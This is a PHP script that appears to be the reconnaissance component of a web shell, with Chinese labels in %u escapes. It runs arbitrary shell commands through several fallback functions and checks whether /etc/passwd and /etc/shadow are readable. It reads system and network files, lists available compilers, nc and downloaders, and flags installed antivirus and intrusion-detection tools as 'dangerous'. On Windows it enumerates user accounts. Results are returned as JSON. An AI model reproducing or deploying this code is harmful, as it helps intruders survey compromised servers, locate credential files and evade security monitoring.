<?php
/**
 * Created by PhpStorm.
 * User: abcdlzy
 * Date: 14/12/2
 * Time: 下午5:04
 */
header('Content-type: text/html; charset=utf8');

echo header('Content-type: text/html; charset=utf8');
function execute($cfe) {
    $res = '';
    if ($cfe){
        if(function_exists('system')) {
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        }
        elseif(function_exists('passthru')) {
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('shell_exec')) {
            $res = @shell_exec($cfe);
        } elseif(function_exists('exec')) {
            @exec($cfe,$res);$res = join(" ",$res);
        } elseif(@is_resource($f = @popen($cfe,"r"))) {
            $res = '';
            while(!@feof($f)) {
                $res .= @fread($f,1024);
            }@pclose($f);
        }
    }
    return $res;
}
function which($pr) {
    $path = execute("which $pr");
    return ($path ? $path : $pr);
}
$out=array();
$is_win=DIRECTORY_SEPARATOR == '\\';
if( !$is_win ) {
    $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
    $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
    $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
    $out[]=array('/etc/passwd %u53EF%u8BFB%u6027', @is_readable('/etc/passwd') ? "yes" : 'no');
    $out[]=array('/etc/shadow %u53EF%u8BFB%u6027', @is_readable('/etc/shadow') ? "yes" : 'no');
    $out[]=array('%u64CD%u4F5C%u7CFB%u7EDF%u7248%u672C', @file_get_contents('/proc/version'));
    $out[]=array('%u767B%u9646%u754C%u9762', @file_get_contents('/etc/issue.net'));
    $safe_mode = @ini_get('safe_mode');
    if(!$GLOBALS['safe_mode']) {
        $temp=array();
        foreach ($userful as $item)
            if(which($item)){
                $temp[]=$item;
            }
        $out[]=array('%u6709%u7528%u7684%u51FD%u6570', implode(', ',$temp));
        $temp=array();
        foreach ($danger as $item)
            if(which($item)){
                $temp[]=$item;
            }
        $out[]=array('%u5371%u9669%u51FD%u6570', implode(', ',$temp));
        $temp=array();
        foreach ($downloaders as $item)
            if(which($item)){
                $temp[]=$item;
            }
        $out[]=array('%u4E0B%u8F7D%u547D%u4EE4', implode(', ',$temp));
        $out[]=array('Hosts', @file_get_contents('/etc/hosts'));
        $out[]=array('%u786C%u76D8%u7A7A%u95F4', execute('df -h'));
        $out[]=array('%u6302%u8F7D%u9009%u9879', @file_get_contents('/etc/fstab'));
    }
} else {
    $out[]=array('%u7CFB%u7EDF%u7248%u672C',execute('ver'));
    $out[]=array('%u8D26%u53F7%u8BBE%u7F6E',execute('net accounts'));
    $out[]=array('%u7528%u6237%u8D26%u53F7',execute('net user'));
    $out[]=array('IP%u914D%u7F6E',execute('ipconfig -all'));
}
echo json_encode(['resInfo'=>$out]);
?>
